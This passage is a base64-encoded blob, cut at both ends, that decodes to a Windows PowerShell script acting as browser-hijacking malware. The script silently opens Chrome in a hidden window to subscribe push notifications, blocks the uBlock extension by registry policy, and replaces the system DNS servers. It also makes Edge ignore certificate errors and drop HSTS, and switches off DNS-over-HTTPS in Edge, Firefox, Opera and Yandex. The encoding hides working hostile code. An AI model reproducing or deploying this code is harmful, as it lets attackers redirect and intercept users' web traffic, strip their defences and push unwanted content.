cQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIg0KICAgICkNCiAgICAkcmVzb2x2ZWRQYXRocyA9IEAoKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICRjaHJvbWVQYXRocykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHJlc29sdmVkUGF0aCA9IFJlc29sdmUtUGF0aCAtUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICAgICAgaWYgKCRyZXNvbHZlZFBhdGggLW5vdGluICRyZXNvbHZlZFBhdGhzKSB7DQogICAgICAgICAgICAgICAgJHJlc29sdmVkUGF0aHMgKz0gJHJlc29sdmVkUGF0aC5QYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJFcnJvciByZXNvbHZpbmcgcGF0aDogJF8iDQogICAgICAgIH0NCiAgICB9DQogICAgJHJlc29sdmVkUGF0aHMgPSAkcmVzb2x2ZWRQYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICRyZXNvbHZlZFBhdGhzKSB7DQogICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGgpIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRm91bmQgQ2hyb21lIGF0OiAkcGF0aCINCg0KICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvDQogICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5GaWxlTmFtZSA9ICRwYXRoDQogICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Bcmd1bWVudHMgPSAkdXJsDQogICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlDQogICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkZmFsc2UNCiAgICAgICAgICAgICRwcm9jZXNzID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcw0KICAgICAgICAgICAgJHByb2Nlc3MuU3RhcnRJbmZvID0gJHByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICRwcm9jZXNzLlN0YXJ0KCkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgJGVuZFRpbWUgPSAoR2V0LURhdGUpLkFkZFNlY29uZHMoNikNCiAgICAgICAgICAgIHdoaWxlICgoR2V0LURhdGUpIC1sdCAkZW5kVGltZSkgew0KICAgICAgICAgICAgICAgIGlmICgkaXNEZWJ1ZyAtZXEgJGZhbHNlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUsIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDENCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlLCBbVXNlcjMyWF06OlNXX1NIT1cpIHwgT3V0LU51bGwNCiAgICAgICAgICAgIENsb3NlLUNocm9tZSAtcHJvY2VzcyAkcHJvY2Vzcw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJDaHJvbWUgbm90IGZvdW5kIGF0OiAkcGF0aCINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVQdXNoZXMgew0KICAgIEFkZC1UeXBlIEAiDQogICAgdXNpbmcgU3lzdGVtOw0KICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOw0KICAgIHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsNCiAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCg0KICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgVXNlcjMyWCB7DQogICAgICAgIHB1YmxpYyBkZWxlZ2F0ZSBib29sIEVudW1XaW5kb3dzUHJvYyhJbnRQdHIgaFduZCwgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhFbnVtV2luZG93c1Byb2MgbHBFbnVtRnVuYywgSW50UHRyIGxQYXJhbSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0TGVuZ3RoKEludFB0ciBoV25kKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIElzV2luZG93VmlzaWJsZShJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICBpZiAobGVuZ3RoID09IDApIHJldHVybiBTdHJpbmcuRW1wdHk7DQoNCiAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcihsZW5ndGggKyAxKTsNCiAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICByZXR1cm4gSXNXaW5kb3dWaXNpYmxlKGhXbmQpICYmIEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCkgPiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgdmFyIHdpbmRvd0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7DQogICAgICAgICAgICBFbnVtV2luZG93cygoaFduZCwgbFBhcmFtKSA9PiB7DQogICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgIHdpbmRvd0hhbmRsZXMuQWRkKGhXbmQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0sIEludFB0ci5aZXJvKTsNCiAgICAgICAgICAgIHJldHVybiB3aW5kb3dIYW5kbGVzLlRvQXJyYXkoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KDQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfTUlOSU1JWkUgPSA2Ow0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX1NIT1cgPSA1Ow0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBDbG9zZVdpbmRvdyhJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgY29uc3QgdWludCBXTV9DTE9TRSA9IDB4MDAxMDsNCiAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICB9DQogICAgfQ0KIkANCg0KICAgIENsb3NlLUFsbENocm9tZXM7DQogICAgUmVtb3ZlLVB1c2hlczsNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkeHB1c2hlcykgew0KICAgICAgICBBZGQtUHVzaCAtcHVzaFVybCAkcHVzaA0KICAgIH0NCiAgICBMaXN0LVB1c2hlczsNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkeHB1c2hlcykgew0KICAgICAgICBPcGVuLUNocm9tZVdpdGhVcmwgLXVybCAkcHVzaA0KICAgIH0NCn0NCgoKDQoNCmZ1bmN0aW9uIENvbmZpZ3VyZUNocm9tZVVibG9jayB7DQogICAgJGtleXdvcmRzID0gQCgidUJsb2NrIikNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRjaHJvbWVEaXIgPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICJHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XEV4dGVuc2lvbnMiDQogICAgICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkY2hyb21lRGlyIC1QYXRoVHlwZSBDb250YWluZXIpIHsNCiAgICAgICAgICAgICAgICAkZXh0ZW5zaW9ucyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGNocm9tZURpciAtRGlyZWN0b3J5DQoNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkZXh0ZW5zaW9uIGluICRleHRlbnNpb25zKSB7DQogICAgICAgICAgICAgICAgICAgICRtYW5GaWxlID0gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgLWZvbGRlciAkZXh0ZW5zaW9uLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgICAgIGlmICgkbWFuRmlsZSAtbmUgIiIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRmb3VuZEtleXdvcmQgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hbmlmZXN0VmFsdWUgaW4gJGtleXdvcmRzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkbWFuRmlsZSAtUmF3DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRjb250ZW50IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hbmlmZXN0VmFsdWUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmb3VuZEtleXdvcmQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRmb3VuZEtleXdvcmQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZXh0Rm9sZGVyTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRleHRlbnNpb24uRnVsbE5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdEFsbCAtZXh0TmFtZSAkZXh0Rm9sZGVyTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGZvbGRlcg0KICAgICkNCg0KICAgICRyZXN1bHQgPSAiIg0KDQogICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkZm9sZGVyIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBpZiAoLW5vdCAoJF8uUFNJc0NvbnRhaW5lcikpIHsNCiAgICAgICAgICAgIGlmICgkXy5OYW1lIC1lcSAibWFuaWZlc3QuanNvbiIpIHsNCiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJF8uRnVsbE5hbWUNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlaWYgKCRfLk5hbWUgLW5vdGluIEAoJy4nLCAnLi4nKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIC1mb2xkZXIgJF8uRnVsbE5hbWUNCiAgICAgICAgICAgIGlmICgkcmVzdWx0IC1uZSAiIikgew0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCg0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0QWxsIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGV4dE5hbWUNCiAgICApDQoNCiAgICBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0IC1leHROYW1lICRleHROYW1lIC1icm93c2VyICJHb29nbGVcQ2hyb21lIg0KfQ0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGV4dE5hbWUsDQogICAgICAgIFtzdHJpbmddJGJyb3dzZXINCiAgICApDQoNCiAgICAkcmVnUGF0aCA9ICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1wkYnJvd3NlclxFeHRlbnNpb25JbnN0YWxsQmxvY2tsaXN0Ig0KICAgIA0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJlZ1BhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgICRyZWdLZXlJbmRleCA9IDENCiAgICBkbyB7DQogICAgICAgICRrZXlOYW1lID0gIiRyZWdLZXlJbmRleCINCiAgICAgICAgJHZhbCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKCR2YWwgLWVxICRleHROYW1lKSB7DQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgfQ0KICAgICAgICAkcmVnS2V5SW5kZXgrKw0KICAgIH0gdW50aWwgKC1ub3QgKFRlc3QtUGF0aCAiJHJlZ1BhdGhcJGtleU5hbWUiKSkNCg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGggLU5hbWUgJGtleU5hbWUgLVZhbHVlICRleHROYW1lDQp9DQoKCg0KDQpmdW5jdGlvbiBTZXQtRG5zU2VydmVycyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRwcmltYXJ5RG5zU2VydmVyLA0KICAgICAgICBbc3RyaW5nXSRzZWNvbmRhcnlEbnNTZXJ2ZXINCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAjIEdldCBuZXR3b3JrIGFkYXB0ZXJzIHRoYXQgYXJlIElQLWVuYWJsZWQNCiAgICAgICAgJG5ldHdvcmtBZGFwdGVycyA9IEdldC1OZXRBZGFwdGVyIHwgV2hlcmUtT2JqZWN0IHsgJF8uU3RhdHVzIC1lcSAnVXAnIC1hbmQgJF8uSW50ZXJmYWNlRGVzY3JpcHRpb24gLW5vdGxpa2UgJypWaXJ0dWFsKicgfQ0KDQogICAgICAgIGZvcmVhY2ggKCRhZGFwdGVyIGluICRuZXR3b3JrQWRhcHRlcnMpIHsNCiAgICAgICAgICAgICMgU2V0IEROUyBzZXJ2ZXJzIHVzaW5nIFNldC1EbnNDbGllbnRTZXJ2ZXJBZGRyZXNzIGNtZGxldA0KICAgICAgICAgICAgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgLUludGVyZmFjZUFsaWFzICRhZGFwdGVyLk5hbWUgLVNlcnZlckFkZHJlc3NlcyBAKCRwcmltYXJ5RG5zU2VydmVyLCAkc2Vjb25kYXJ5RG5zU2VydmVyKSAtQ29uZmlybTokZmFsc2UNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJTdWNjZXNzZnVsbHkgc2V0IEROUyBzZXJ2ZXJzIGZvciBhZGFwdGVyOiAkKCRhZGFwdGVyLkludGVyZmFjZURlc2NyaXB0aW9uKSINCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1FcnJvciAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgIH0NCn0NCmZ1bmN0aW9uIENvbmZpZ3VyZUVkZ2Ugew0KICAgICRlZGdlS2V5UGF0aCA9ICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRWRnZSINCiAgICANCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRlZGdlS2V5UGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGVkZ2VLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgICRjb21tYW5kTGluZVBhdGggPSBKb2luLVBhdGggJGVkZ2VLZXlQYXRoICJDb21tYW5kTGluZSINCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjb21tYW5kTGluZVBhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRjb21tYW5kTGluZVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQogICAgDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY29tbWFuZExpbmVQYXRoIC1OYW1lICIoRGVmYXVsdCkiIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWljIC0tZGlzYWJsZS1oc3RzIg0KICAgIA0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGVkZ2VLZXlQYXRoIC1OYW1lICJEbnNPdmVySHR0cHMiIC1WYWx1ZSAib2ZmIg0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkZWRnZUtleVBhdGggLU5hbWUgIklnbm9yZUNlcnRpZmljYXRlRXJyb3JzIiAtVmFsdWUgMQ0KfQ0KCgoNCg0KZnVuY3Rpb24gQ29uZmlndXJlRmlyZUZveCANCnsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBTZXQtRmlyZWZveFJlZ2lzdHJ5IC1LZXlQYXRocyBAKA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdmVySFRUUFMnLA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdmVySFRUUFMnDQogICAgICAgICkgLVZhbHVlTmFtZXMgQCgnRW5hYmxlZCcsICdMb2NrZWQnKSAtVmFsdWVzIEAoMCwgMSkNCiAgICB9DQogICAgY2F0Y2ggDQogICAgew0KICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gc2V0IGZpcmVmb3ggcmVnaXN0cnk6ICRfIg0KICAgIH0NCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgDQogICAgew0KICAgICAgICB0cnkgDQogICAgICAgIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcdXNlci5qcyINCg0KICAgICAgICAgICAgJFVzZXJKU0NvbnRlbnQgPSAndXNlcl9wcmVmKCJuZXR3b3JrLnRyci5tb2RlIiwgNSk7Jw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIShUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkcGF0aCAtSXRlbVR5cGUgRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRwYXRoIC1WYWx1ZSAkVXNlckpTQ29udGVudCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIA0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gd3JpdGUgdG8gdXNlci5qcyBmaWxlOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBTZXQtRmlyZWZveFJlZ2lzdHJ5IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kS2V5UGF0aHMsDQogICAgICAgIFtzdHJpbmdbXV0kVmFsdWVOYW1lcywNCiAgICAgICAgW2ludFtdXSRWYWx1ZXMNCiAgICApDQoNCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgJHJlZ0tleSA9IFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnldOjpMb2NhbE1hY2hpbmUNCg0KICAgIHRyeSB7DQogICAgICAgIGZvcmVhY2ggKCRpIGluIDAuLigkS2V5UGF0aHMuTGVuZ3RoIC0gMSkpIHsNCiAgICAgICAgICAgICRrZXkgPSAkcmVnS2V5Lk9wZW5TdWJLZXkoJEtleVBhdGhzWyRpXSwgJHRydWUpDQogICAgICAgICAgICBpZiAoJGtleSAtZXEgJG51bGwpIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gb3BlbiByZWdpc3RyeSBrZXk6ICQoJEtleVBhdGhzWyRpXSkiDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRrZXkuU2V0VmFsdWUoJFZhbHVlTmFtZXNbJGldLCAkVmFsdWVzWyRpXSwgW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeVZhbHVlS2luZF06OkRXb3JkKQ0KICAgICAgICAgICAgJGtleS5DbG9zZSgpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBhY2Nlc3Npbmcgb3IgbW9kaWZ5aW5nIHJlZ2lzdHJ5OiAkXyINCiAgICB9DQp9DQoKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVPcGVyYQ0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdvcGVyYV9jcmFzaHJlcG9ydGVyLmV4ZScsICdvcGVyYS5leGUnKSkNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAnT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXExvY2FsIFN0YXRlJw0KDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRXJyb3Igb2NjdXJyZWQgaW4gT3BlcmE6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVPcGVyYUludGVybmFsIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgNCiAgICApDQoNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzID0gQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAnb3BlcmEnID0gQHsNCiAgICAgICAgICAgICAgICAnZG9oX21vZGUnID0gJ29mZicNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICd0ZW1wbGF0ZXMnID0gIiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm1vZGUgPSAnb2ZmJw0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5vcGVyYSA9IEB7DQogICAgICAgICAgICAnZG9oX21vZGUnID0gJ29mZicNCiAgICAgICAgfQ0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy50ZW1wbGF0ZXMgPSAiIg0KICAgIH0NCg0KICAgICRqc29uU3RyaW5nID0gJGNvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCg0KICAgIFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtVmFsdWUgJGpzb25TdHJpbmcgLUVuY29kaW5nIFVURjggLUZvcmNlDQoNCiAgICBXcml0ZS1Ib3N0ICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBPcGVyYSBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVZYW5kZXgNCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnc2VydmljZV91cGRhdGUuZXhlJywnYnJvd3Nlci5leGUnKSkNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAnWWFuZGV4XFlhbmRleEJyb3dzZXJcVXNlciBEYXRhXExvY2FsIFN0YXRlJw0KDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZ3VyZVlhbmRleEludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBvY2N1cnJlZDogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZVlhbmRleEludGVybmFsIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgNCiAgICApDQogICAgJGNvbnRlbnQgPSBHZXQtQ29udGV